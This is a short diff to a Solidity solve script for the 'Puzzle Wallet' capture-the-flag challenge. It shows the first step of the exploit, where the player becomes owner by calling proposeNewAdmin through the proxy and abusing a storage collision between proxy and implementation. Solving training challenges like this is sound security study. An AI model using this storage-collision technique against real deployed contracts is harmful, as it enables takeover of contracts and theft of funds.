@@ -9,16 +9,14 @@ contract Check is CheckScript("PUZZLE_WALLET") {}
 
 contract Solve is SolveScript("PUZZLE_WALLET") {
     PuzzleWallet target;
-    PuzzleProxy proxy;
 
     constructor() {
         target = PuzzleWallet(instance);
-        // FIXME: get proxy address here
     }
 
     function attack() public override {
         // become owner (thanks to storage collision)
-        proxy.proposeNewAdmin(player);
+        PuzzleProxy(payable(address(target))).proposeNewAdmin(player);
         require(target.owner() == player, "should become owner");
 
         // whitelist ourselves for the multicall in the next step
